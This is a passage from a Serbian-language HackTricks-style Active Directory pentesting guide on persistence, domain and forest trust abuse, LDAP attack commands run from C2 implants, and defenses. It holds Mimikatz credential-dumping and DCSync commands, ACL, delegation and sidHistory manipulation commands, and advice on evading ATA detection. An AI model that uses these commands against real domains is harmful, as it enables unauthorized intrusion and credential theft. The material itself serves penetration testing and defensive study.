**Security descriptors** se koriste za **čuvanje** **dozvola** koje **objekat** ima **nad** nekim drugim **objektom**. Ako možete napraviti čak i **malu promenu** u **security descriptor-u** nekog objekta, možete dobiti veoma zanimljive privilegije nad tim objektom bez potrebe da budete član privilegovane grupe.


{{#ref}}
security-descriptors.md
{{#endref}}

### Skeleton Key

Izmenite **LSASS** u memoriji kako biste uspostavili **univerzalnu lozinku**, dajući pristup svim domen nalozima.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Možete kreirati sopstveni **SSP** da **uhvatite** u **plain text** kredencijale koji se koriste za pristup mašini.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Registruje **novi Domain Controller** u AD i koristi ga da **gurne atribute** (SIDHistory, SPNs...) na određene objekte **bez** ostavljanja logova vezanih za **modifikacije**. Potrebne su DA privilegije i biti unutar **root domena**.\
Napomena: ako koristite pogrešne podatke, pojaviće se prilično ružni logovi.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS persistencija

Ranije smo diskutovali kako eskalirati privilegije ako imate **dovoljne permisije da čitate LAPS lozinke**. Međutim, ove lozinke se takođe mogu koristiti za **održavanje persistencije**.\
Pogledajte:


{{#ref}}
laps.md
{{#endref}}

## Eskalacija privilegija preko Forest-a - Domain Trusts

Microsoft smatra **Forest** bezbednosnom granicom. To implicira da **kompromitovanje jednog domena može potencijalno dovesti do kompromitovanja celog Forest-a**.

### Osnovne informacije

[**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) je bezbednosni mehanizam koji omogućava korisniku iz jednog **domena** da pristupi resursima u drugom **domenu**. U suštini, kreira vezu između sistema autentikacije ta dva domena, omogućavajući protok verifikacija autentikacije. Kada domeni uspostave trust, oni razmenjuju i čuvaju specifične **ključeve** u svojim **Domain Controller-ima (DCs)**, koji su ključni za integritet trust-a.

U tipičnom scenariju, ako korisnik želi da pristupi servisu u **trusted domain-u**, prvo mora da zatraži specijalnu kartu poznatu kao **inter-realm TGT** od DC-a svog domena. Ovaj TGT je enkriptovan sa deljenim **kljućem** koji su oba domena dogovorila. Korisnik tada predaje ovaj inter-realm TGT **DC-u trusted domena** da bi dobio servisnu kartu (**TGS**). Nakon uspešne verifikacije inter-realm TGT-a od strane DC-a trusted domena, on izdaje TGS, dajući korisniku pristup servisu.

**Koraci**:

1. Klijent računar u **Domain 1** započinje proces koristeći svoj **NTLM hash** da zatraži **Ticket Granting Ticket (TGT)** od svog **Domain Controller-a (DC1)**.
2. DC1 izdaje novi TGT ako je klijent uspešno autentifikovan.
3. Klijent zatim traži **inter-realm TGT** od DC1, koji je potreban da bi pristupio resursima u **Domain 2**.
4. Inter-realm TGT je enkriptovan sa **trust key** koji dele DC1 i DC2 kao deo dvosmernog domain trust-a.
5. Klijent odnosi inter-realm TGT do **Domain 2-ovog Domain Controller-a (DC2)**.
6. DC2 verifikuje inter-realm TGT koristeći svoj deljeni trust key i, ako je validan, izdaje **Ticket Granting Service (TGS)** za server u Domain 2 kome klijent želi pristupiti.
7. Na kraju, klijent prezentuje taj TGS serveru, koji je enkriptovan sa hash-om serverovog naloga, da bi dobio pristup servisu u Domain 2.

### Različiti trust-ovi

Važno je primetiti da **trust može biti jednosmeran ili dvosmeran**. U opciji sa 2 strane, oba domena će se međusobno verovati, ali u **jednosmernom** odnosu poverenja jedan od domena će biti **trusted**, a drugi **trusting** domen. U tom slučaju, **moći ćete samo da pristupate resursima unutar trusting domena iz trusted domena**.

Ako Domain A trust-uje Domain B, A je trusting domain, a B je trusted. Štaviše, u **Domain A**, ovo bi bio **Outbound trust**; i u **Domain B**, ovo bi bio **Inbound trust**.

**Različiti odnosi poverenja**

- **Parent-Child Trusts**: Ovo je čest aranžman unutar istog forest-a, gde child domen automatski ima dvosmerni tranzitivni trust sa svojim parent domenom. U suštini, to znači da autentikacioni zahtevi mogu neometano da teku između parent i child.
- **Cross-link Trusts**: Nazivaju se i "shortcut trusts", uspostavljaju se između child domena radi ubrzanja procesa referrala. U kompleksnim forest-ovima, autentikacioni referali obično moraju putovati do root-a forest-a pa zatim naniže do ciljnog domena. Kreiranjem cross-link-ova put je skraćen, što je naročito korisno u geografski raširenim okruženjima.
- **External Trusts**: Uspostavljaju se između različitih, nepovezanih domena i po prirodi su non-transitive. Prema [Microsoft dokumentaciji](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), external trusts su korisni za pristup resursima u domenu izvan trenutnog forest-a koji nije povezan forest trust-om. Bezbednost se pojačava korišćenjem SID filtriranja sa external trust-ovima.
- **Tree-root Trusts**: Ovi trust-ovi se automatski uspostavljaju između forest root domena i novododanog tree root-a. Iako nisu često susretani, tree-root trust-ovi su važni za dodavanje novih domain tree-ova u forest, omogućavajući im da zadrže jedinstveno ime domena i osiguravaju dvosmernu tranzitivnost. Više informacija možete naći u [Microsoft-ovom vodiču](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Ova vrsta trust-a je dvosmerni tranzitivni trust između dva forest root domena, takođe namećući SID filtriranje radi povećanja bezbednosti.
- **MIT Trusts**: Ovi trust-ovi se uspostavljaju sa non-Windows, [RFC4120-kompatibilnim](https://tools.ietf.org/html/rfc4120) Kerberos domenima. MIT trust-ovi su specijalizovaniji i služe okruženjima koja zahtevaju integraciju sa Kerberos sistemima izvan Windows ekosistema.

#### Druge razlike u odnosima poverenja

- Odnos poverenja takođe može biti **tranzitivan** (A trust-uje B, B trust-uje C, onda A trust-uje C) ili **netransitivan**.
- Odnos poverenja može biti postavljen kao **bidirekcioni** (oba se međusobno veruju) ili kao **jednosmerni** (samo jedan veruje drugom).

### Put napada

1. **Enumerišite** odnose poverenja
2. Proverite da li neki **security principal** (user/group/computer) ima **pristup** resursima **drugog domena**, možda preko ACE unosa ili članstvom u grupama drugog domena. Tražite **odnose preko domena** (trust je verovatno kreiran zbog ovoga).
1. kerberoast u ovom slučaju može biti još jedna opcija.
3. **Kompromitujte** **naloge** koji mogu **pivot-ovati** kroz domene.

Napadači mogu dobiti pristup resursima u drugom domenu kroz tri osnovna mehanizma:

- **Local Group Membership**: Principali mogu biti dodati u lokalne grupe na mašinama, poput “Administrators” grupe na serveru, što im daje značajnu kontrolu nad tom mašinom.
- **Foreign Domain Group Membership**: Principali takođe mogu biti članovi grupa unutar stranog domena. Međutim, efikasnost ove metode zavisi od prirode trust-a i obima grupe.
- **Access Control Lists (ACLs)**: Principali mogu biti navedeni u **ACL-u**, posebno kao entiteti u **ACE-ovima** unutar **DACL-a**, dajući im pristup specifičnim resursima. Za dublje razumevanje mehanike ACL-ova, DACL-ova i ACE-ova, whitepaper “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” je neprocenjiv izvor.

### Pronalaženje eksternih korisnika/grupa sa permisijama

Možete proveriti **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** da biste pronašli foreign security principals u domenu. Ovo će biti korisnici/grupe iz **eksternog domena/foresta**.

Ovo možete proveriti u **Bloodhound**-u ili koristeći powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Drugi načini za enumeraciju domain trusts:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Postoje **2 trusted keys**, jedna za _Child --> Parent_ i druga za _Parent_ --> _Child_.\
> Možete saznati koja se koristi od strane trenutnog domena pomoću:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Eskalirajte do Enterprise admin u child/parent domain zloupotrebom trust-a pomoću SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Razumevanje kako Configuration Naming Context (NC) može biti eksploatisan je ključno. Configuration NC služi kao centralni repozitorijum za konfiguracione podatke kroz forest u Active Directory (AD) okruženjima. Ovi podaci se repliciraju na sve Domain Controller (DC) unutar foresta, pri čemu writable DC-ovi održavaju upisivu kopiju Configuration NC. Da bi se ovo iskoristilo, potrebno je imati **SYSTEM privilegije na DC-u**, po mogućstvu na child DC-u.

**Link GPO to root DC site**

Sites kontejner u Configuration NC sadrži informacije o sajtovima svih računara pridruženih domenu unutar AD foresta. Radeći sa SYSTEM privilegijama na bilo kojem DC-u, napadači mogu povezati GPO-e sa root DC site-ovima. Ova akcija potencijalno kompromituje root domen manipulisanjem politikama koje se primenjuju na te sajtove.

Za detaljnije informacije, možete istražiti rad na [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

Jedan vektor napada uključuje ciljanje privilegovanih gMSA unutar domena. KDS Root key, koji je neophodan za izračunavanje lozinki gMSA, smešten je unutar Configuration NC. Sa SYSTEM privilegijama na bilo kojem DC-u moguće je pristupiti KDS Root key i izračunati lozinke za bilo koji gMSA kroz forest.

Detaljna analiza i korak-po-korak vodič mogu se naći u:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Komplementarni delegated MSA attack (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Dodatna eksterna istraživanja: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Ova metoda zahteva strpljenje — čekanje na kreiranje novih privilegovanih AD objekata. Sa SYSTEM privilegijama, napadač može izmeniti AD Schema da dodeli bilo kojem korisniku potpuni kontrolu nad svim klasama. To može dovesti do neautorizovanog pristupa i kontrole nad novokreiranim AD objektima.

Dalje čitanje dostupno je na [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

ADCS ESC5 ranjivost cilja kontrolu nad PKI objektima kako bi se kreirao certificate template koji omogućava autentifikaciju kao bilo koji korisnik unutar foresta. Pošto PKI objekti žive u Configuration NC, kompromitovanje writable child DC omogućava izvođenje ESC5 napada.

Više detalja možete pročitati u [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). U scenarijima bez ADCS-a, napadač ima mogućnost postaviti potrebne komponente, kao što je opisano u [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
U ovom scenariju **vaš domen je poveren** od strane eksternog domena koji vam daje **neodređena ovlašćenja** nad njim. Moraćete da utvrdite **koji entiteti (principals) iz vašeg domena imaju koji pristup nad eksternim domenom** i potom pokušate to iskoristiti:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Eksterni Forest domen - Jednosmerno (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
U ovom scenariju **vaš domen** **veruje** nekim **privilegijama** entiteta iz **drugog domena**.

Međutim, kada domen bude **trusted** od strane domena koji mu veruje, povereni domen **kreira korisnika** sa **predvidivim imenom** koji za **lozinku koristi trusted password**. To znači da je moguće **pristupiti korisniku iz domena koji veruje kako biste ušli u povereni domen** da biste ga enumerisali i pokušali da eskalirate privilegije:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Drugi način kompromitovanja poverenog domena je pronalaženje [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) kreiranog u **suprotnom smeru** domenskog trusta (što nije često).

Još jedan način da se kompromituje povereni domen je da se sačeka na mašini kojoj **korisnik iz poverenog domena može pristupiti** preko **RDP**. Tada bi napadač mogao da ubaci kod u proces RDP sesije i odatle **pristupi originalnom domenu žrtve**.\
Štaviše, ako je **žrtva montirala svoj hard disk**, iz procesa **RDP session** napadač bi mogao da smesti **backdoors** u **startup folder hard diska**. Ova tehnika se zove **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Domain trust abuse mitigation

### **SID Filtering:**

- Rizik od napada koji koriste atribut SID history preko forest trustova se ublažava SID Filtering, koji je podrazumevano aktiviran na svim inter-forest trustovima. To počiva na pretpostavci da su intra-forest trustovi sigurni, smatrajući forest, a ne domen, za bezbednosnu granicu u skladu sa Microsoftovim stavom.
- Međutim, postoji problem: SID filtering može poremetiti aplikacije i korisnički pristup, zbog čega se povremeno isključuje.

### **Selective Authentication:**

- Za inter-forest trustove, primena Selective Authentication osigurava da korisnici iz dva foresta nisu automatski autentifikovani. Umesto toga, potrebne su eksplicitne dozvole da bi korisnici pristupili domenima i serverima u okviru domena ili foresta koji veruje.
- Važno je napomenuti da ove mere ne štite od iskorišćavanja writable Configuration Naming Context (NC) ili napada na trust account.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-based AD zloporaba iz on-host implantata

The [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) re-implementira bloodyAD-style LDAP primitive kao x64 Beacon Object Files koje se izvršavaju u potpunosti unutar on-host implantata (npr. Adaptix C2). Operateri kompajliraju paket sa `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, učitaju `ldap.axs`, i zatim pozovu `ldap <subcommand>` iz beacon-a. Sav saobraćaj koristi trenutni logon security context preko LDAP (389) sa signing/sealing ili LDAPS (636) sa automatskim poveravanjem sertifikata, tako da nisu potrebni socks proxyji niti artefakti na disku.

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers` rešavaju kratka imena/OU putanje u pune DNs i ispisuju odgovarajuće objekte.
- `get-object`, `get-attribute`, and `get-domaininfo` vuku proizvoljne atribute (uključujući security descriptors) plus forest/domain metapodatke iz `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, and `get-rbcd` otkrivaju roasting kandidate, podešavanja delegacije, i postojeće [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) opisivače direktno iz LDAP-a.
- `get-acl` and `get-writable --detailed` parsiraju DACL da navedu trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes) i nasleđivanje, dajući trenutne ciljeve za eskalaciju privilegija kroz ACL.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP write primitives for escalation & persistence

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) omogućavaju operatoru da postavi nove principe ili mašinske naloge gde god postoje prava nad OU. `add-groupmember`, `set-password`, `add-attribute`, and `set-attribute` direktno preuzimaju ciljeve čim se nađu write-property prava.
- Komande fokusirane na ACL kao što su `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, i `add-dcsync` prevode WriteDACL/WriteOwner na bilo kojem AD objektu u password resets, kontrolu članstva u grupama, ili DCSync privilegije za replikaciju bez ostavljanja PowerShell/ADSI artefakata. `remove-*` kontraparti čiste ubačene ACEs.

### Delegation, roasting, and Kerberos abuse

- `add-spn`/`set-spn` momentalno čine kompromitovanog korisnika Kerberoastable; `add-asreproastable` (UAC toggle) označava ga za AS-REP roasting bez diranja lozinke.
- Delegation macros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) prepisuju `msDS-AllowedToDelegateTo`, UAC flags, ili `msDS-AllowedToActOnBehalfOfOtherIdentity` iz beacona, omogućavajući constrained/unconstrained/RBCD puteve napada i eliminišući potrebu za remote PowerShell ili RSAT.

### sidHistory injection, OU relocation, and attack surface shaping

- `add-sidhistory` ubacuje privilegovane SIDs u SID history kontrolisanog principala (see [SID-History Injection](sid-history-injection.md)), pružajući prikriveno nasleđivanje pristupa potpuno preko LDAP/LDAPS.
- `move-object` menja DN/OU računara ili korisnika, omogućavajući napadaču da premesti resurse u OU-e gde već postoje delegirana prava pre nego što zloupotrebi `set-password`, `add-groupmember`, ili `add-spn`.
- Usko ograničene komande za uklanjanje (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, itd.) omogućavaju brzo vraćanje stanja nakon što operator požanje kredencijale ili persistenciju, minimizirajući telemetriju.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Some General Defenses

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **Defensive Measures for Credential Protection**

- **Domain Admins Restrictions**: Preporučuje se da Domain Admins smeju da se prijavljuju samo na Domain Controllers, izbegavajući njihovu upotrebu na drugim hostovima.
- **Service Account Privileges**: Servisi ne bi trebalo da se pokreću sa Domain Admin (DA) privilegijama radi održavanja bezbednosti.
- **Temporal Privilege Limitation**: Za zadatke koji zahtevaju DA privilegije, njihovo trajanje treba ograničiti. Ovo se može postići pomoću: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Audit Event IDs 2889/3074/3075 i potom primeniti LDAP signing plus LDAPS channel binding na DC-evima/klijentima da biste blokirali LDAP MITM/relay pokušaje.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### **Implementing Deception Techniques**

- Implementacija tehnika obmane uključuje postavljanje zamki, kao što su decoy users or computers, sa osobinama kao što su lozinke koje ne ističu ili su označeni kao Trusted for Delegation. Detaljan pristup uključuje kreiranje korisnika sa specifičnim pravima ili dodavanje u grupe visokih privilegija.
- Praktičan primer uključuje korišćenje alata kao što su: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Više o deploymentu tehnika obmane možete naći na [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identifying Deception**

- **For User Objects**: Sumnjivi indikatori uključuju netipičan ObjectSID, retke prijave, datume kreiranja i mali broj neuspelih pokušaja lozinke.
- **General Indicators**: Poređenje atributa potencijalnih decoy objekata sa onima kod stvarnih objekata može otkriti nekonzistentnosti. Alati poput [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) mogu pomoći u identifikaciji takvih obmana.

### **Bypassing Detection Systems**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Izbegavanje enumeracije sesija na Domain Controllers kako bi se sprečilo otkrivanje od strane ATA.
- **Ticket Impersonation**: Korišćenje **aes** ključeva za kreiranje tiketa pomaže izbeći detekciju jer ne dolazi do downgrading-a na NTLM.
- **DCSync Attacks**: Preporučuje se izvođenje sa ne-Domain Controller-a da bi se izbeglo otkrivanje od strane ATA, jer direktno izvođenje sa Domain Controller-a izaziva alarme.

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
